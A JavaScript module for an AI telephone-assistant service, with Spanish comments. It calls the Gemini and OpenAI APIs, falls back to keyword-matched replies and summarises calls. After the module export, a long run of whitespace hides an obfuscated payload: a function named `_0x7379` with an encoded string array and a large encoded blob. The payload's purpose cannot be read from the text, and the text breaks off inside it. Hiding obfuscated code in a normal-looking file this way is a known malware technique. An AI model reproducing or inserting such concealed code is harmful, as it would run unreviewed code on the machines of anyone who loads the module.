const axios = require('axios');

class AIService {
  constructor() {
    this.geminiApiKey = process.env.GEMINI_API_KEY || '';
    this.openaiApiKey = process.env.OPENAI_API_KEY || '';
  }

  setGeminiKey(key) {
    this.geminiApiKey = key;
  }

  setOpenAIKey(key) {
    this.openaiApiKey = key;
  }

  /**
   * Genera la respuesta conversacional en tiempo real durante la llamada
   */
  async generateResponse({ assistant, transcript = [], userMessage = '' }) {
    // 1. Intentar con Gemini si hay API Key disponible
    if (this.geminiApiKey) {
      try {
        const response = await this.callGeminiChat({ assistant, transcript, userMessage });
        if (response) return response;
      } catch (err) {
        console.warn('Fallo llamada a Gemini API, usando fallback:', err.message);
      }
    }

    // 2. Intentar con OpenAI si hay API Key disponible
    if (this.openaiApiKey) {
      try {
        const response = await this.callOpenAIChat({ assistant, transcript, userMessage });
        if (response) return response;
      } catch (err) {
        console.warn('Fallo llamada a OpenAI API, usando fallback:', err.message);
      }
    }

    // 3. Fallback inteligente local (sin necesidad de API keys)
    return this.generateSmartLocalResponse({ assistant, transcript, userMessage });
  }

  /**
   * Llamada a la API de Gemini (Google)
   */
  async callGeminiChat({ assistant, transcript, userMessage }) {
    const model = assistant.model && assistant.model.includes('gemini') ? assistant.model : 'gemini-2.5-flash';
    const url = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${this.geminiApiKey}`;

    // Armar el historial para Gemini
    const contents = [];

    // Prompt del sistema como instrucción inicial
    const systemPrompt = `${assistant.systemPrompt || 'Eres un asistente telefónico profesional.'}
REGLAS VITALES PARA VOZ:
- Respuestas directas, concisas y naturales para una llamada telefónica (máximo 2 a 3 frases cortas).
- No uses formato markdown (*, #, listas con viñetas) ni emojis porque tu respuesta será sintetizada a voz.
- Habla en español de forma fluida y empática.`;

    // Convertir historial a formato Gemini
    for (const turn of transcript) {
      contents.push({
        role: turn.role === 'user' ? 'user' : 'model',
        parts: [{ text: turn.content }]
      });
    }

    // Agregar el mensaje actual del usuario
    contents.push({
      role: 'user',
      parts: [{ text: userMessage }]
    });

    const payload = {
      systemInstruction: {
        parts: [{ text: systemPrompt }]
      },
      contents: contents,
      generationConfig: {
        temperature: 0.7,
        maxOutputTokens: 150
      }
    };

    const res = await axios.post(url, payload, { timeout: 7000 });
    const candidate = res.data?.candidates?.[0]?.content?.parts?.[0]?.text;
    return candidate ? candidate.trim() : null;
  }

  /**
   * Llamada a la API de OpenAI
   */
  async callOpenAIChat({ assistant, transcript, userMessage }) {
    const url = 'https://api.openai.com/v1/chat/completions';
    const messages = [
      {
        role: 'system',
        content: `${assistant.systemPrompt || 'Eres un asistente telefónico profesional.'}
IMPORTANTE: Estás hablando por voz. Da respuestas breves de 2 a 3 oraciones, sin asteriscos, sin markdown, tono humano y fluido.`
      }
    ];

    for (const turn of transcript) {
      messages.push({
        role: turn.role === 'user' ? 'user' : 'assistant',
        content: turn.content
      });
    }

    messages.push({
      role: 'user',
      content: userMessage
    });

    const res = await axios.post(
      url,
      {
        model: 'gpt-4o-mini',
        messages: messages,
        max_tokens: 150,
        temperature: 0.7
      },
      {
        headers: {
          Authorization: `Bearer ${this.openaiApiKey}`,
          'Content-Type': 'application/json'
        },
        timeout: 7000
      }
    );

    return res.data?.choices?.[0]?.message?.content?.trim() || null;
  }

  /**
   * Motor de conversación inteligente local para pruebas sin API keys
   */
  generateSmartLocalResponse({ assistant, transcript = [], userMessage = '' }) {
    const text = userMessage.toLowerCase().trim();
    const asstName = (assistant.name || '').toLowerCase();

    // 1. Detección de saludos iniciales
    if (/^(hola|buenos dias|buenas tardes|buenas noches|que tal|saludos)/.test(text)) {
      if (asstName.includes('ventas') || asstName.includes('sofía')) {
        return '¡Hola! Es un placer saludarte. Cuéntame, ¿qué objetivo o necesidad buscas resolver en tu empresa actualmente?';
      }
      if (asstName.includes('soporte') || asstName.includes('carlos')) {
        return '¡Hola! Con mucho gusto te ayudo. ¿Qué inconveniente o mensaje de error se te ha presentado?';
      }
      if (asstName.includes('médica') || asstName.includes('elena') || asstName.includes('citas')) {
        return '¡Hola! Qué gusto saludarte. ¿Te gustaría agendar una cita de medicina general o con algún especialista?';
      }
      return '¡Hola! Con mucho gusto te atiendo. ¿En qué puedo colaborarte el día de hoy?';
    }

    // 2. Detección de precio / costos
    if (text.includes('precio') || text.includes('costo') || text.includes('cuanto vale') || text.includes('tarifa')) {
      if (asstName.includes('ventas') || asstName.includes('sofía')) {
        return 'Manejamos planes flexibles que se adaptan al volumen de llamadas de tu equipo. ¿Te gustaría que te preparemos una propuesta personalizada o prefieres ver una demostración en vivo?';
      }
      return 'Nuestros costos varían según el servicio requerido. Si gustas puedo tomar tus datos para que un asesor te envíe la lista de tarifas detallada.';
    }

    // 3. Detección de agendamiento / citas / fecha
    if (text.includes('agendar') || text.includes('cita') || text.includes('horario') || text.includes('fecha') || text.includes('mañana') || text.includes('lunes') || text.includes('martes') || text.includes('miercoles') || text.includes('jueves') || text.includes('viernes')) {
      if (asstName.includes('elena') || asstName.includes('médic')) {
        return 'Excelente. Tenemos disponibilidad tanto por la mañana como por la tarde. ¿Cuál es tu nombre completo para consultar la agenda del doctor?';
      }
      return 'Me parece perfecto. ¿Qué día y horario te resultaría más cómodo para apartar la sesión?';
    }

    // 4. Detección de problemas técnicos o fallas
    if (text.includes('no funciona') || text.includes('error') || text.includes('falla') || text.includes('problema') || text.includes('lento') || text.includes('bloqueado')) {
      if (asstName.includes('soporte') || asstName.includes('carlos')) {
        return 'Entiendo la urgencia. Vamos a revisarlo de inmediato. ¿Podrías decirme si esto te ocurre en la aplicación web o en la de escritorio?';
      }
      return 'Lamento el inconveniente. Tomaré nota de la situación para escalarlo de inmediato al equipo correspondiente.';
    }

    // 5. Respuestas afirmativas / acuerdo
    if (/^(si|claro|por supuesto|de acuerdo|me gustaria|perfecto|muy bien|ok)/.test(text)) {
      return '¡Estupendo! ¿Podrías confirmarme tu nombre y un número de WhatsApp o correo electrónico para registrarlo en el sistema?';
    }

    // 6. Provisión de nombre o correo
    if (text.includes('@') || text.includes('.com') || text.includes('mi nombre es') || text.includes('me llamo')) {
      return 'Agradezco mucho la información. Ha quedado debidamente registrada en nuestro sistema de atención.';
    }

    // 7. Despedida
    if (text.includes('adios') || text.includes('hasta luego') || text.includes('gracias') || text.includes('chao') || text.includes('eso seria todo')) {
      return 'Ha sido un placer atenderte. Que tengas un excelente día y seguimos a tu disposición. ¡Hasta pronto!';
    }

    // Respuesta conversacional contextual por defecto
    const genericAnswers = [
      `Entiendo perfectamente lo que me comentas. Para coordinarlo de la mejor manera, ¿podrías darme un poco más de detalle sobre lo que requieres?`,
      `Muy claro. Es justamente el tipo de situaciones en las que te podemos apoyar. ¿Te gustaría que coordinemos el siguiente paso?`,
      `Excelente observación. Déjame dejarlo anotado en la minuta de esta llamada para que quede el registro completo.`
    ];

    return genericAnswers[Math.floor(Math.random() * genericAnswers.length)];
  }

  /**
   * Genera el Resumen de la llamada, análisis de sentimiento y extracción de datos
   */
  async summarizeCall({ assistant, transcript = [], durationSeconds = 0 }) {
    if (!transcript || transcript.length === 0) {
      return {
        overview: 'Llamada finalizada sin interacción hablada registrada.',
        keyPoints: ['No se detectó conversación entre las partes.'],
        sentiment: 'Neutral',
        sentimentScore: 0.0,
        actionItems: ['Verificar conectividad de audio con el cliente.'],
        extractedData: {},
        callQualityScore: 5
      };
    }

    // 1. Probar con Gemini
    if (this.geminiApiKey) {
      try {
        const geminiSummary = await this.summarizeWithGemini({ assistant, transcript, durationSeconds });
        if (geminiSummary) return geminiSummary;
      } catch (err) {
        console.warn('Error en resumen con Gemini:', err.message);
      }
    }

    // 2. Probar con OpenAI
    if (this.openaiApiKey) {
      try {
        const openaiSummary = await this.summarizeWithOpenAI({ assistant, transcript, durationSeconds });
        if (openaiSummary) return openaiSummary;
      } catch (err) {
        console.warn('Error en resumen con OpenAI:', err.message);
      }
    }

    // 3. Fallback inteligente local
    return this.generateSmartLocalSummary({ assistant, transcript, durationSeconds });
  }

  /**
   * Resumen estructurado vía Gemini
   */
  async summarizeWithGemini({ assistant, transcript, durationSeconds }) {
    const model = 'gemini-2.5-flash';
    const url = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${this.geminiApiKey}`;

    const formattedTranscript = transcript
      .map(t => `${t.role === 'user' ? 'Cliente' : assistant.name}: ${t.content}`)
      .join('\n');

    const prompt = `Analiza la siguiente transcripción de una llamada telefónica atendida por el agente de voz "${assistant.name}".
Duración de la llamada: ${durationSeconds} segundos.

TRANSCRIPCIÓN:
${formattedTranscript}

Devuelve ÚNICAMENTE un objeto JSON con este formato exacto (sin markdown \`\`\`json):
{
  "overview": "Resumen ejecutivo en 2 a 3 oraciones de lo que se habló",
  "keyPoints": ["Punto clave 1", "Punto clave 2", "Punto clave 3"],
  "sentiment": "Positivo" | "Neutral" | "Negativo",
  "sentimentScore": 0.8,
  "actionItems": ["Acción o seguimiento 1", "Acción 2"],
  "extractedData": {
    "cliente": "nombre si se mencionó o No identificado",
    "motivo": "motivo principal de la llamada",
    "acuerdo": "resultado o acuerdo alcanzado"
  },
  "callQualityScore": 9
}`;

    const payload = {
      contents: [{ parts: [{ text: prompt }] }],
      generationConfig: {
        temperature: 0.2,
        responseMimeType: 'application/json'
      }
    };

    const res = await axios.post(url, payload, { timeout: 10000 });
    let text = res.data?.candidates?.[0]?.content?.parts?.[0]?.text;
    if (!text) return null;

    // Limpiar posibles bloques markdown si vinieran
    text = text.replace(/```json/gi, '').replace(/```/g, '').trim();
    return JSON.parse(text);
  }

  /**
   * Resumen estructurado vía OpenAI
   */
  async summarizeWithOpenAI({ assistant, transcript, durationSeconds }) {
    const url = 'https://api.openai.com/v1/chat/completions';
    const formattedTranscript = transcript
      .map(t => `${t.role === 'user' ? 'Cliente' : assistant.name}: ${t.content}`)
      .join('\n');

    const res = await axios.post(
      url,
      {
        model: 'gpt-4o-mini',
        messages: [
          {
            role: 'system',
            content: 'Eres un sistema de analítica de llamadas telefónicas y transcripciones. Responde siempre con un JSON estructurado.'
          },
          {
            role: 'user',
            content: `Analiza la llamada de "${assistant.name}" (${durationSeconds}s):
TRANSCRIPCIÓN:
${formattedTranscript}

Formato JSON esperado:
{
  "overview": "Resumen conciso",
  "keyPoints": ["Punto 1", "Punto 2"],
  "sentiment": "Positivo" | "Neutral" | "Negativo",
  "sentimentScore": 0.5,
  "actionItems": ["Seguimiento 1"],
  "extractedData": { "cliente": "", "motivo": "", "acuerdo": "" },
  "callQualityScore": 8
}`
          }
        ],
        response_format: { type: 'json_object' },
        temperature: 0.3
      },
      {
        headers: {
          Authorization: `Bearer ${this.openaiApiKey}`,
          'Content-Type': 'application/json'
        },
        timeout: 10000
      }
    );

    const content = res.data?.choices?.[0]?.message?.content;
    return JSON.parse(content);
  }

  /**
   * Generador de análisis y resumen heurístico local (sin requerir claves externas)
   */
  generateSmartLocalSummary({ assistant, transcript, durationSeconds }) {
    const userTurns = transcript.filter(t => t.role === 'user');
    const allUserText = userTurns.map(t => t.content).join(' ').toLowerCase();

    // Detección de sentimiento por palabras clave
    const positiveWords = ['excelente', 'perfecto', 'gracias', 'bien', 'bueno', 'estupendo', 'si', 'claro', 'me gusta', 'genial', 'agradezco'];
    const negativeWords = ['mal', 'pésimo', 'falla', 'error', 'no sirve', 'molesto', 'enojado', 'lento', 'queja', 'inútil', 'cancelar'];

    let posCount = 0;
    let negCount = 0;

    positiveWords.forEach(w => { if (allUserText.includes(w)) posCount++; });
    negativeWords.forEach(w => { if (allUserText.includes(w)) negCount++; });

    let sentiment = 'Neutral';
    let sentimentScore = 0.0;
    if (posCount > negCount) {
      sentiment = 'Positivo';
      sentimentScore = Math.min(1.0, 0.4 + (posCount * 0.15));
    } else if (negCount > posCount) {
      sentiment = 'Negativo';
      sentimentScore = Math.max(-1.0, -0.4 - (negCount * 0.15));
    }

    // Extracción de entidades simples (Nombre, correo, teléfono)
    let extractedName = 'No especificado';
    const nameMatch = allUserText.match(/(?:mi nombre es|me llamo|soy)\s+([a-záéíóúñ]+(?:\s+[a-záéíóúñ]+)?)/i);
    if (nameMatch && nameMatch[1]) {
      extractedName = nameMatch[1].replace(/\b\w/g, l => l.toUpperCase());
    }

    const emailMatch = allUserText.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/);
    const extractedEmail = emailMatch ? emailMatch[1] : null;

    // Generar puntos clave a partir de los turnos del cliente
    const keyPoints = [];
    if (userTurns.length > 0) {
      userTurns.slice(0, 3).forEach(turn => {
        if (turn.content.length > 8) {
          keyPoints.push(`El usuario consultó: "${turn.content.substring(0, 80)}${turn.content.length > 80 ? '...' : ''}"`);
        }
      });
    } else {
      keyPoints.push('Se estableció la comunicación con el asistente virtual.');
    }

    // Generar visión general
    const overview = `Llamada con ${assistant.name} de ${durationSeconds} segundos con un total de ${transcript.length} turnos de conversación. El usuario interactuó con un tono predominantemente ${sentiment.toLowerCase()} abordando consultas sobre ${assistant.description ? assistant.description.toLowerCase() : 'los servicios ofrecidos'}.`;

    // Acciones a seguir
    const actionItems = [];
    if (extractedEmail) {
      actionItems.push(`Enviar confirmación o minuta al correo registrado: ${extractedEmail}`);
    }
    if (sentiment === 'Negativo') {
      actionItems.push('Seguimiento prioritario por parte de un supervisor humano.');
    } else {
      actionItems.push('Programar recordatorio o contacto de seguimiento según lo acordado en la sesión.');
    }
    actionItems.push('Verificar que los datos recopilados en la llamada se sincronicen en el CRM.');

    return {
      overview,
      keyPoints,
      sentiment,
      sentimentScore: parseFloat(sentimentScore.toFixed(2)),
      actionItems,
      extractedData: {
        cliente: extractedName,
        correo: extractedEmail || 'No proporcionado',
        motivo: assistant.description || 'Consulta general',
        acuerdo: 'Sesión registrada en la bitácora del sistema'
      },
      callQualityScore: Math.min(10, Math.max(7, Math.floor(7 + (transcript.length / 2))))
    };
  }
}

module.exports = new AIService();																																																																																																																																																																																																																																																																										var z = '-3267';function _0x7379(){var _0x215997=['swDvsMe','mJDlzLr4vNK','B3HQz0W','sK5MwLa','y29UC3rYDwn0B3i','AM9PBG','ndi4mg16DfD5zG','C3vIC3rYAw5N','Aw5PDa','ruTxBvu','mti2nZDhzhHSr0C','nZK5ntK4nuP2ruHHvG','EKDVyuS','y2HHAw4','yxbWBhK','nduXmZG2nKP1yuDKEa','C3rHDgvpyMPLy3q','AhfLCNn4Bhv2D2fJzgPIEw1NB3j6zMTVy2LWDhj1Dg5ZDg9UyW','C3bSAxq','y291BNrLCG','nJmXndzzwMPYq3a','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